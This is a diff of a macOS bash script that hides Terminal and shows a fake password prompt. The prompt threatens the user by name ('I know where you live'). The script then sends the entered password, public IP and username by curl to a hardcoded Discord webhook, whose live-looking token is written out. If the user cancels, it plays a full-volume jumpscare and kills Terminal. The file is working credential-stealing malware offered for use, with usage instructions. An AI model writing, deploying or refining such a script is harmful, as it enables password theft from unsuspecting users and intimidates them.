@@ -1,22 +1,23 @@
 #!/bin/bash
-# Combined Login Prompt with Jumpscare Fallback for macOS (Python-Free JSON using awk/sed)
-# ------------------------------------------------------------------------------
+# Combined Login Prompt with Jumpscare Fallback for macOS
+# ----------------------------------------------------------------
 # - Displays a login prompt with two lines:
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# - If a non-empty password is entered, the script sends the data (password, public IP, username)
+# - If the user enters a non-empty password, it sends the data (password, public IP, username)
 #   to a Discord webhook.
-# - If the user presses Cancel (or closes the prompt), it triggers a jumpscare:
-#     It creates a temporary HTML file that embeds your jumpscare video from GitHub,
+# - If the user presses Cancel, it triggers a jumpscare:
+#     It downloads an MP4 video from your GitHub repository,
+#     creates a temporary HTML file that embeds the video,
 #     sets system volume to maximum, opens it in the default browser in full screen,
-#     and then forcefully kills Terminal.
+#     then forcefully kills Terminal.
 #
 # Requirements:
-#   - macOS with osascript, curl, and standard Unix utilities.
+#   - macOS with osascript, curl, and either python3 or python installed.
 #
 # Usage:
-#   chmod +x script.sh
-#   ./script.sh
+#   chmod +x combined_script.sh
+#   ./combined_script.sh
 
 # --- Hide Terminal Immediately ---
 osascript -e 'tell application "Terminal" to set visible of front window to false'
@@ -28,6 +29,10 @@ username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /logi
 capture="username=${username}\n____________________________________________\n\n"
 
 # --- Define AppleScript Login Prompt ---
+# The prompt displays:
+#   Line 1: "I know where you live, [FirstName]."
+#   Line 2: "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
+# It will re-prompt if the input is empty, but if the user cancels, it returns "CANCEL".
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
@@ -124,17 +129,19 @@ else
     # --- Save Data to Temporary File ---
     echo -e "$capture" > /tmp/pass.txt
     
-    # --- Manually Generate JSON Payload Without Python ---
-    # Replace actual newlines with literal "\n" using tr, and escape any double quotes.
-    content=$(tr '\n' '\\n' < /tmp/pass.txt | sed 's/"/\\"/g')
-    payload=$(printf '{"content": "%s"}' "$content")
+    # --- Determine Python Interpreter (Prefer python3) ---
+    if command -v python3 &>/dev/null; then
+        PYTHON=python3
+    else
+        PYTHON=python
+    fi
     
-    # --- Debug: Log the payload for troubleshooting ---
-    echo "Payload: $payload" > /tmp/discord_payload.log
+    # --- Generate JSON Payload ---
+    payload=$($PYTHON -c 'import json,sys; data=sys.stdin.read().strip(); print(json.dumps({"content": data}))' < /tmp/pass.txt)
     
     # --- Send Payload to Discord Webhook ---
     DISCORD_WEBHOOK="https://discord.com/api/webhooks/1356139808321179678/8ZUgN4B7F7M3tkPlUrc_gVNp1celjIS9JpUwkJKoFZVj61sgOK2T34-zlkZ0CMDmml6B"
-    curl -v -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK" >> /tmp/discord_payload.log 2>&1
+    curl -X POST -H "Content-Type: application/json" -d "$payload" "$DISCORD_WEBHOOK"
     rm /tmp/pass.txt
     
     # --- Force Kill Terminal ---
